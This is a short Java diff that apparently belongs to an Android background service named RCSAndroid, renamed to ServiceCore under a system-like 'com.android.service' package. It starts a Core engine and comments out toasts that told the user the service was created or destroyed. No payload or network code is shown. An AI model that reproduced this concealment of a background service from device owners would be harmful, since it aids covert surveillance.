@@ -1,4 +1,7 @@
-package com.android.service;
+package com.android.service.app;
+
+import com.android.service.Core;
+import com.android.service.Status;
 
 import android.app.Service;
 import android.content.Intent;
@@ -8,10 +11,12 @@ import android.widget.Toast;
 
 
 /**
- * The Class RCSAndroid.
+ * The Class ServiceCore.
  */
-public class RCSAndroid extends Service {
-	private static final String TAG = "RCSAndroid";
+public class ServiceCore extends Service {
+	private static final String TAG = "ServiceCore";
+	
+	private Core core;
 	
 	/* (non-Javadoc)
 	 * @see android.app.Service#onBind(android.content.Intent)
@@ -29,7 +34,8 @@ public class RCSAndroid extends Service {
 		super.onCreate();
 		Log.d("QZ", TAG + " (onCreate)");
 
-		Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
+		//Toast.makeText(this, "Service Created", Toast.LENGTH_LONG).show();
+		Status.setAppContext(getApplicationContext());
 	}
 
 	/* (non-Javadoc)
@@ -40,7 +46,9 @@ public class RCSAndroid extends Service {
 		super.onDestroy();
 		Log.d("QZ", TAG + " (onDestroy)");
 
-		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
+		//Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
+		core.Stop();
+		core = null;
 	}
 
 	/* (non-Javadoc)
@@ -53,22 +61,11 @@ public class RCSAndroid extends Service {
 		
 		Toast.makeText(this, "Service Started, starting thread", Toast.LENGTH_LONG).show();
 		
-		CoreThread core = new CoreThread();
-		
-		// Core starts
-		core.Start();
-		
-		/*try {
-			Thread.sleep(30000);
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		}
 			
-		Toast.makeText(this, "Stopping thread", Toast.LENGTH_LONG).show();
-		
-		// Core stops
-		core.Stop();
-		core = null;*/
+		core = new Core();
+
+		// Core starts
+		core.Start(this.getResources(), getContentResolver());
 	}
 }
 
